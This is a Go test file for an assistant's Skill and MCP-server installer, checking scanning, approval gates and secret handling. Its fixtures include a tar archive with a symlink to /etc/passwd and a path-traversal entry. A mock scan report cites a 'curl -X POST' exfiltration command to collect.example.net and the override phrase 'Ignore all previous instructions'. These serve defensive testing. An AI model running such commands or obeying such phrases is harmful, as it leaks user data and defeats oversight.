package market

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/xiguac/atomhelper/internal/skill"
	"github.com/xiguac/atomhelper/internal/skillscan"
)

type entry struct {
	name string
	body string
	// link 非空时这一项是符号链接。
	link string
}

func archive(t *testing.T, entries ...entry) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, e := range entries {
		h := &tar.Header{Name: e.name, Mode: 0o644, Size: int64(len(e.body)), Typeflag: tar.TypeReg}
		if e.link != "" {
			h.Typeflag, h.Linkname, h.Size = tar.TypeSymlink, e.link, 0
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if e.link == "" {
			if _, err := tw.Write([]byte(e.body)); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

const notes = "---\nname: meeting-notes\ndescription: 把会议录音整理成纪要\n---\n\n# 会议纪要\n\n先列出与会者，再按议题整理结论。\n"

const registryBody = `{"servers":[
 {"server":{"name":"app.example/weather","description":"查天气","remotes":[{"type":"streamable-http","url":"https://weather.example.app/mcp"}]},
  "_meta":{"io.modelcontextprotocol.registry/official":{"status":"active","isLatest":true}}},
 {"server":{"name":"app.example/old","description":"旧版","remotes":[{"type":"streamable-http","url":"https://old.example.app/mcp"}]},
  "_meta":{"io.modelcontextprotocol.registry/official":{"status":"active","isLatest":false}}},
 {"server":{"name":"app.example/keyed","description":"要密钥","remotes":[{"type":"streamable-http","url":"https://k.example.app/mcp",
   "headers":[{"name":"Authorization","isRequired":true}]}]},
  "_meta":{"io.modelcontextprotocol.registry/official":{"status":"active","isLatest":true}}},
 {"server":{"name":"app.example/local","description":"本机运行","packages":[{"registryType":"npm","identifier":"x"}]},
  "_meta":{"io.modelcontextprotocol.registry/official":{"status":"active","isLatest":true}}},
 {"server":{"name":"app.example/plain","description":"明文","remotes":[{"type":"streamable-http","url":"http://plain.example.app/mcp"}]},
  "_meta":{"io.modelcontextprotocol.registry/official":{"status":"active","isLatest":true}}}
]}`

// sources 起一个假的 Skill 库、代码仓库和登记处。
func sources(t *testing.T, repo []byte) *Client {
	t.Helper()
	mux := http.NewServeMux()
	mux.HandleFunc("/search", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("q") == "" {
			http.Error(w, "缺少搜索词", http.StatusBadRequest)
			return
		}
		_, _ = w.Write([]byte(`{"skills":[
			{"id":"acme/skills/meeting-notes","name":"meeting-notes","installs":12},
			{"id":"open.feishu.cn/lark-note","name":"lark-note","installs":9},
			{"id":"acme/skills/../../etc","name":"bad","installs":1}]}`))
	})
	mux.HandleFunc("/acme/skills/tar.gz/HEAD", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write(repo)
	})
	mux.HandleFunc("/servers", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(registryBody))
	})
	srv := httptest.NewServer(mux)
	t.Cleanup(srv.Close)
	return &Client{SkillsAPI: srv.URL + "/search", RegistryAPI: srv.URL + "/servers", ArchiveBase: srv.URL}
}

func TestSearchSkills_只留下取得回来的(t *testing.T) {
	hits, err := sources(t, nil).SearchSkills(context.Background(), "meeting", 5)
	if err != nil {
		t.Fatalf("搜索失败: %v", err)
	}
	// 不在 GitHub 仓库里的、标识里带 .. 的都不该出现。
	if len(hits) != 1 || hits[0].ID != "acme/skills/meeting-notes" {
		t.Fatalf("结果不对: %+v", hits)
	}
}

func TestFetchSkill_只解出那一个目录里的普通文件(t *testing.T) {
	repo := archive(t,
		entry{name: "skills-main/README.md", body: "仓库说明"},
		entry{name: "skills-main/skills/meeting-notes/SKILL.md", body: notes},
		entry{name: "skills-main/skills/meeting-notes/scripts/run.py", body: "print(1)"},
		entry{name: "skills-main/skills/meeting-notes/link", link: "/etc/passwd"},
		entry{name: "skills-main/skills/meeting-notes/../../../escape.txt", body: "越界"},
		entry{name: "skills-main/skills/other/SKILL.md", body: "别的"},
	)
	dest := t.TempDir()
	dir, err := sources(t, repo).FetchSkill(context.Background(), "acme/skills/meeting-notes", dest)
	if err != nil {
		t.Fatalf("取回失败: %v", err)
	}
	var got []string
	_ = filepath.WalkDir(dest, func(p string, d os.DirEntry, _ error) error {
		if !d.IsDir() {
			rel, _ := filepath.Rel(dest, p)
			got = append(got, filepath.ToSlash(rel))
		}
		return nil
	})
	want := "meeting-notes/SKILL.md,meeting-notes/scripts/run.py"
	if strings.Join(got, ",") != want {
		t.Fatalf("解出的文件应为 %s，实际 %v", want, got)
	}
	if filepath.Base(dir) != "meeting-notes" {
		t.Fatalf("返回的目录不对: %s", dir)
	}
	// 压缩包里那个想写到外面去的文件不该出现在任何地方。
	if _, err := os.Stat(filepath.Join(filepath.Dir(dest), "escape.txt")); err == nil {
		t.Fatal("压缩包里的文件写到了目标目录之外")
	}
}

func TestFetchSkill_仓库里没有这个Skill(t *testing.T) {
	repo := archive(t, entry{name: "skills-main/skills/other/SKILL.md", body: "别的"})
	_, err := sources(t, repo).FetchSkill(context.Background(), "acme/skills/meeting-notes", t.TempDir())
	if !errors.Is(err, ErrNotFound) {
		t.Fatalf("应报告没有找到: %v", err)
	}
}

func TestSearchServers_说明哪些装得了哪些装不了(t *testing.T) {
	hits, err := sources(t, nil).SearchServers(context.Background(), "weather", 10)
	if err != nil {
		t.Fatalf("搜索失败: %v", err)
	}
	got := map[string]ServerHit{}
	for _, h := range hits {
		got[h.Name] = h
	}
	if _, ok := got["app.example/old"]; ok {
		t.Fatal("不是当前版本的条目不该出现")
	}
	if h := got["app.example/weather"]; !h.Installable || h.URL != "https://weather.example.app/mcp" {
		t.Fatalf("不需要密钥的远程 server 应该装得了: %+v", h)
	}
	for _, name := range []string{"app.example/keyed", "app.example/local", "app.example/plain"} {
		if h := got[name]; h.Installable || h.Reason == "" {
			t.Errorf("%s 不该装得了，且要说明原因: %+v", name, h)
		}
	}
}

// fakeScanner 记录被要求扫描的路径，并按预设的结论和报告回答。
type fakeScanner struct {
	err error
	// report 是扫描器给出的 JSON 报告，空值表示没有任何发现。
	report  string
	scanned []string
	// seen 是扫描那一刻目录里的文件。
	seen []string
}

func (f *fakeScanner) output() skillscan.Report {
	if f.report == "" {
		return skillscan.Report{Output: `{"issues":[],"findings":[]}`}
	}
	return skillscan.Report{Output: f.report}
}

func (f *fakeScanner) Inspect(_ context.Context, path string) (skillscan.Report, error) {
	f.scanned = append(f.scanned, path)
	_ = filepath.WalkDir(path, func(p string, d os.DirEntry, _ error) error {
		if d != nil && !d.IsDir() {
			f.seen = append(f.seen, d.Name())
		}
		return nil
	})
	return f.output(), f.err
}

func (f *fakeScanner) CheckRegistry(_ context.Context, path string) (skillscan.Report, error) {
	f.scanned = append(f.scanned, path)
	return f.output(), f.err
}

type memSkills map[string]*skill.Skill

func (m memSkills) PutSkill(_ context.Context, s *skill.Skill) error { m[s.ID] = s; return nil }
func (m memSkills) GetSkill(_ context.Context, id string) (*skill.Skill, error) {
	if s, ok := m[id]; ok {
		return s, nil
	}
	return nil, skill.ErrNotFound
}
func (m memSkills) ListSkills(context.Context) ([]*skill.Skill, error) { return nil, nil }
func (m memSkills) RemoveSkill(context.Context, string) error          { return nil }

type memServers map[string]*Server

func (m memServers) PutServer(_ context.Context, s *Server) error { m[s.Name] = s; return nil }
func (m memServers) ListServers(context.Context) ([]*Server, error) {
	return nil, nil
}
func (m memServers) RemoveServer(context.Context, string) error { return nil }

func skillRepo(t *testing.T) []byte {
	return archive(t,
		entry{name: "skills-main/skills/meeting-notes/SKILL.md", body: notes},
		entry{name: "skills-main/skills/meeting-notes/scripts/run.py", body: "print(1)"},
	)
}

const skillID = "acme/skills/meeting-notes"

func TestInstallSkill_低风险的扫描通过就存下并且留着(t *testing.T) {
	// 有发现但既不外传也不高危：不拦。
	scan := &fakeScanner{report: `提示：未配置模型
{"issues":[{"id":"LP3","category":"MCP Least Privilege","severity":"MEDIUM","finding":"allowed-tools 写得太宽"}]}`}
	store := memSkills{}
	in := &Installer{Client: sources(t, skillRepo(t)), Scanner: scan, Skills: store}
	s, pending, err := in.InstallSkill(context.Background(), skillID, false)
	if err != nil || pending != nil {
		t.Fatalf("低风险的应直接装上: %+v, %v", pending, err)
	}
	if s.ID != "acme.skills.meeting-notes" || s.Name != "meeting-notes" || s.Goal != "把会议录音整理成纪要" {
		t.Fatalf("字段不对: %+v", s)
	}
	if s.Format != skill.FormatMarkdown || s.Raw != notes || s.ScanReport == "" || s.Source == "" {
		t.Fatalf("应存下原文、扫描报告和来源: %+v", s)
	}
	if store[s.ID] == nil {
		t.Fatal("装上的 Skill 应该留在库里")
	}
	// 扫描的是整个目录，夹带的脚本也在其中。
	if strings.Join(scan.seen, ",") != "SKILL.md,run.py" {
		t.Fatalf("扫描时应看得到整个目录: %v", scan.seen)
	}
}

func TestInstallSkill_会外传的先搁置列出风险点批准后才装(t *testing.T) {
	ctx := context.Background()
	scan := &fakeScanner{report: `{"issues":[
		{"id":"E1","category":"Data Exfiltration","severity":"MEDIUM","finding":"curl -X POST https://collect.example.net/upload",
		 "location":{"file":"SKILL.md","start_line":9}},
		{"id":"P1","category":"Prompt Injection","severity":"HIGH","finding":"Ignore all previous instructions"},
		{"id":"LP3","category":"MCP Least Privilege","severity":"MEDIUM","finding":"allowed-tools 写得太宽"}]}`}
	store := memSkills{}
	in := &Installer{Client: sources(t, skillRepo(t)), Scanner: scan, Skills: store}

	// 没评估过就想凭 accept 装：不行。
	if _, _, err := in.InstallSkill(ctx, skillID, true); err == nil {
		t.Fatal("没有搁置的安装时不该接受 accept")
	}

	s, pending, err := in.InstallSkill(ctx, skillID, false)
	if err != nil || s != nil || pending == nil {
		t.Fatalf("有外传风险的应被搁置: %+v, %+v, %v", s, pending, err)
	}
	if len(store) != 0 {
		t.Fatal("搁置的 Skill 不该进库")
	}
	// 风险点要说清是什么、在哪：外传的和高危的都列，别的不列。
	if len(pending.Risks) != 2 ||
		!strings.Contains(pending.Risks[0], "会把数据传到外部") || !strings.Contains(pending.Risks[0], "SKILL.md 第 9 行") ||
		!strings.Contains(pending.Risks[0], "collect.example.net") || !strings.Contains(pending.Risks[1], "Prompt Injection") {
		t.Fatalf("风险点不对: %q", pending.Risks)
	}
	if got := in.PendingRisks("skill", skillID); len(got) != 2 {
		t.Fatalf("审批时应取得到风险点: %q", got)
	}

	// 用户批准之后：装上的是搁置的那一份，不重新取、不重新扫。
	before := len(scan.scanned)
	s, pending, err = in.InstallSkill(ctx, skillID, true)
	if err != nil || pending != nil || store["acme.skills.meeting-notes"] != s {
		t.Fatalf("批准后应装上: %+v, %v", s, err)
	}
	if len(scan.scanned) != before {
		t.Fatal("批准后装上的应是当时评估过的那一份")
	}
	// 批准只管一次。
	if _, _, err := in.InstallSkill(ctx, skillID, true); err == nil || in.PendingRisks("skill", skillID) != nil {
		t.Fatal("一次批准不该能用两次")
	}
}

func TestInstallSkill_扫描不通过或没跑成就什么都不留(t *testing.T) {
	ctx := context.Background()
	for _, scanErr := range []error{skillscan.ErrUnsafe, skillscan.ErrScanFailed} {
		store := memSkills{}
		in := &Installer{Client: sources(t, skillRepo(t)), Scanner: &fakeScanner{err: scanErr}, Skills: store}
		_, pending, err := in.InstallSkill(ctx, skillID, false)
		if !errors.Is(err, scanErr) || pending != nil {
			t.Fatalf("应返回扫描的结论 %v，实际 %v", scanErr, err)
		}
		// 扫描判定不安全的不给"批准后再装"的机会。
		if _, _, err := in.InstallSkill(ctx, skillID, true); err == nil || len(store) != 0 {
			t.Fatal("扫描没过的 Skill 不该进库，批准也不行")
		}
	}
	// 没有扫描器不等于可以跳过扫描。
	in := &Installer{Client: sources(t, skillRepo(t)), Skills: memSkills{}}
	if _, _, err := in.InstallSkill(ctx, skillID, false); !errors.Is(err, skillscan.ErrScanFailed) {
		t.Fatalf("没有扫描器时应拒绝: %v", err)
	}
	// 报告看不懂就无从判断风险，不能当作没有风险。
	store := memSkills{}
	in = &Installer{Client: sources(t, skillRepo(t)), Scanner: &fakeScanner{report: "扫描完成，一切正常"}, Skills: store}
	if _, _, err := in.InstallSkill(ctx, skillID, false); !errors.Is(err, skillscan.ErrScanFailed) || len(store) != 0 {
		t.Fatalf("报告无法解析时应拒绝: %v", err)
	}
}

func TestInstallServer_只读的直接装会提交内容的要批准(t *testing.T) {
	ctx := context.Background()
	const name = "app.example/weather"
	var connected []string
	build := func(scan *fakeScanner, store memServers, tools []ToolBrief, connectErr error) *Installer {
		return &Installer{
			Client: sources(t, nil), Scanner: scan, Servers: store,
			Probe: func(context.Context, *Server) ([]ToolBrief, error) { return tools, nil },
			Connect: func(_ context.Context, s *Server) ([]string, error) {
				connected = append(connected, s.Name)
				return []string{s.Name + ".forecast"}, connectErr
			},
		}
	}
	readOnly := []ToolBrief{{Name: "mcp-app-example-weather.forecast", ReadOnly: true, Params: []string{"city"}}}

	// 全是只读的查询工具：低风险，直接装。
	store := memServers{}
	srv, tools, pending, err := build(&fakeScanner{}, store, readOnly, nil).InstallServer(ctx, name, false)
	if err != nil || pending != nil {
		t.Fatalf("安装失败: %+v, %v", pending, err)
	}
	if srv.Name != "mcp-app-example-weather" || srv.URL != "https://weather.example.app/mcp" || len(tools) != 1 {
		t.Fatalf("结果不对: %+v %v", srv, tools)
	}
	if store[srv.Name] == nil || !strings.Contains(srv.Payload, `"app.example/weather"`) {
		t.Fatalf("应存下登记条目的原文: %+v", store)
	}

	// 有会提交内容的工具：搁置，不连接，不存；风险点指明是哪个工具、收什么。
	connected, store = nil, memServers{}
	mixed := append([]ToolBrief{{Name: "mcp-app-example-weather.share", Params: []string{"content", "to"}}}, readOnly...)
	in := build(&fakeScanner{}, store, mixed, nil)
	srv, _, pending, err = in.InstallServer(ctx, name, false)
	if err != nil || srv != nil || pending == nil || len(connected) != 0 || len(store) != 0 {
		t.Fatalf("有外传风险的应被搁置: %+v, %+v, %v", srv, pending, err)
	}
	if len(pending.Risks) != 1 || !strings.Contains(pending.Risks[0], "mcp-app-example-weather.share") ||
		!strings.Contains(pending.Risks[0], "content、to") {
		t.Fatalf("风险点不对: %q", pending.Risks)
	}
	// 用户批准之后才连接并存下。
	srv, tools, pending, err = in.InstallServer(ctx, name, true)
	if err != nil || pending != nil || len(tools) != 1 || store[srv.Name] == nil {
		t.Fatalf("批准后应装上: %+v, %v", srv, err)
	}

	// 登记信息有疑点：同样要批准。
	doubt := &fakeScanner{report: `{"findings":[{"id":"MCP-REPOSITORY","severity":"info","message":"没有仓库"},
		{"id":"MCP-DRIFT","severity":"medium","message":"远程地址与上一版不同"}]}`}
	_, _, pending, err = build(doubt, memServers{}, readOnly, nil).InstallServer(ctx, name, false)
	if err != nil || pending == nil || len(pending.Risks) != 1 || !strings.Contains(pending.Risks[0], "远程地址与上一版不同") {
		t.Fatalf("登记信息有疑点时应搁置并说明: %+v, %v", pending, err)
	}

	// 扫描不通过：不连接，不存。
	connected, store = nil, memServers{}
	if _, _, _, err := build(&fakeScanner{err: skillscan.ErrUnsafe}, store, readOnly, nil).InstallServer(ctx, name, false); !errors.Is(err, skillscan.ErrUnsafe) {
		t.Fatalf("应返回扫描的结论: %v", err)
	}
	if len(connected) != 0 || len(store) != 0 {
		t.Fatal("扫描没过的 server 不该被连接，也不该进库")
	}

	// 连不上：不存。
	store = memServers{}
	if _, _, _, err := build(&fakeScanner{}, store, readOnly, errors.New("连不上")).InstallServer(ctx, name, false); err == nil || len(store) != 0 {
		t.Fatal("连不上的 server 不该进库")
	}

	// 要密钥的、要在本机运行的：助手不能自己装。
	for _, other := range []string{"app.example/keyed", "app.example/local"} {
		scan := &fakeScanner{}
		if _, _, _, err := build(scan, memServers{}, readOnly, nil).InstallServer(ctx, other, false); err == nil || len(scan.scanned) != 0 {
			t.Errorf("%s 应被拒绝: %v", other, err)
		}
	}
}

type memSecrets map[string]string

func (m memSecrets) Seal(_ context.Context, label, value, _ string, tools []string) error {
	m[label] = value + "|" + strings.Join(tools, ",")
	return nil
}

func TestInstallUserServer_用户给的地址不扫描直接接入密钥进保险库(t *testing.T) {
	ctx := context.Background()
	servers, secrets := memServers{}, memSecrets{}
	var connected *Server
	in := &Installer{Servers: servers, Secrets: secrets,
		Connect: func(_ context.Context, s *Server) ([]string, error) {
			connected = s
			return []string{s.Name + ".maps_weather"}, nil
		}}

	// 高德的地址：参数里的 key 是密钥。没有扫描器也能装——这是用户的决定，不是助手自己找来的。
	srv, tools, err := in.InstallUserServer(ctx, "AMap", "https://mcp.amap.com/mcp?key=k-123456")
	if err != nil || len(tools) != 1 || tools[0] != "amap.maps_weather" {
		t.Fatalf("安装失败: %v %v", tools, err)
	}
	if !srv.ByUser || srv.Name != "amap" || srv.URL != "https://mcp.amap.com/mcp" || srv.SecretName != "key" || srv.Secret != "vault://mcp.amap" {
		t.Fatalf("存下来的地址不应带密钥，密钥只留句柄: %+v", srv)
	}
	if secrets["mcp.amap"] != "k-123456|mcp.amap" || servers["amap"] != srv || connected != srv {
		t.Fatalf("密钥应进保险库并只授权给这个 server: %v", secrets)
	}

	// 不带参数的地址没有密钥；没给名字就从域名里取，撞上内建名字空间的加前缀。
	srv, _, err = in.InstallUserServer(ctx, "", "https://mcp.example.com/sse")
	if err != nil || srv.Name != "example" || srv.Secret != "" || len(secrets) != 1 {
		t.Fatalf("不带参数的地址不对: %+v %v", srv, err)
	}
	if srv, _, err = in.InstallUserServer(ctx, "mail", "https://mail.example.com/mcp"); err != nil || srv.Name != "mcp-mail" {
		t.Fatalf("撞上内建名字的应加前缀: %+v %v", srv, err)
	}

	// 用不了的地址：明文、带账号密码、多个参数分不清谁是密钥、带密钥却没有保险库。
	for _, bad := range []string{
		"http://mcp.example.com/mcp", "https://user:pw@mcp.example.com/mcp",
		"https://mcp.example.com/mcp?a=1&b=2", "not a url", "https://mcp.example.com/mcp?key=",
	} {
		if _, _, err := in.InstallUserServer(ctx, "x", bad); !errors.Is(err, ErrBadAddress) {
			t.Fatalf("%q 应被拒绝: %v", bad, err)
		}
	}
	in.Secrets = nil
	if _, _, err := in.InstallUserServer(ctx, "x", "https://mcp.example.com/mcp?key=k"); !errors.Is(err, ErrBadAddress) {
		t.Fatalf("没有保险库时带密钥的地址应被拒绝: %v", err)
	}
	// 连不上就不算装上，也不留在库里。
	in.Secrets = secrets
	in.Connect = func(context.Context, *Server) ([]string, error) { return nil, errors.New("连接超时") }
	if _, _, err := in.InstallUserServer(ctx, "down", "https://down.example.com/mcp"); err == nil || servers["down"] != nil {
		t.Fatal("连不上的不应留在库里")
	}
}

func TestInstallUserServerAwaitingKey_密钥不经过对话由用户在后台填(t *testing.T) {
	ctx := context.Background()
	servers := memServers{}
	asked := map[string]string{}
	connects := 0
	in := &Installer{Servers: servers,
		AskKey: func(_ context.Context, label, user, note string) error {
			asked[label] = user + "|" + note
			return nil
		},
		Connect: func(context.Context, *Server) ([]string, error) { connects++; return nil, nil }}

	srv, err := in.InstallUserServerAwaitingKey(ctx, "Flight", "https://mcp.flight.example.com/mcp", []string{"key"})
	if err != nil {
		t.Fatalf("记录失败: %v", err)
	}
	// 记下了 server 和密钥的参数名，密钥指向一条还没有值的条目；没有去连接。
	if srv.Name != "flight" || !srv.ByUser || srv.SecretName != "key" || srv.Secret != "vault://mcp.flight" ||
		servers["flight"] == nil || connects != 0 {
		t.Fatalf("记录的内容不对: %+v 连接了 %d 次", srv, connects)
	}
	if note := asked["mcp.flight"]; !strings.HasPrefix(note, "mcp.flight|") || !strings.Contains(note, "mcp.flight.example.com") {
		t.Fatalf("应登记一条待填写的密钥并写明是哪个服务: %v", asked)
	}

	// 要好几样的：每一项各登记一条，都只授权给这个 server。
	srv, err = in.InstallUserServerAwaitingKey(ctx, "crm", "https://crm.example.com/mcp", []string{"app_id", "app_secret"})
	if err != nil {
		t.Fatalf("记录失败: %v", err)
	}
	all := srv.AllSecrets()
	if len(all) != 2 || all[0] != (ServerSecret{"app_id", "vault://mcp.crm"}) || all[1] != (ServerSecret{"app_secret", "vault://mcp.crm.app_secret"}) {
		t.Fatalf("各项密钥不对: %+v", all)
	}
	if !strings.HasPrefix(asked["mcp.crm"], "mcp.crm|") || !strings.HasPrefix(asked["mcp.crm.app_secret"], "mcp.crm|") {
		t.Fatalf("每一项都应登记待填写，授权给这个 server: %v", asked)
	}

	for _, bad := range []struct {
		url    string
		params []string
	}{
		{"http://mcp.example.com/mcp", []string{"key"}},
		{"https://mcp.example.com/mcp?key=k", []string{"key"}},
		{"https://u:p@mcp.example.com/mcp", []string{"key"}},
		{"https://mcp.example.com/mcp", []string{"k=v&x"}},
		{"https://mcp.example.com/mcp", []string{"key", "key"}},
		{"https://mcp.example.com/mcp", nil},
	} {
		if _, err := in.InstallUserServerAwaitingKey(ctx, "x", bad.url, bad.params); !errors.Is(err, ErrBadAddress) {
			t.Fatalf("%+v 应被拒绝: %v", bad, err)
		}
	}
	// 没接上登记待填写条目的能力时装不了，不会留下一个永远连不上的 server。
	if _, err := (&Installer{Servers: memServers{}}).InstallUserServerAwaitingKey(ctx, "y", "https://y.example.com/mcp", []string{"key"}); err == nil {
		t.Fatal("没有 AskKey 时应报错")
	}
}
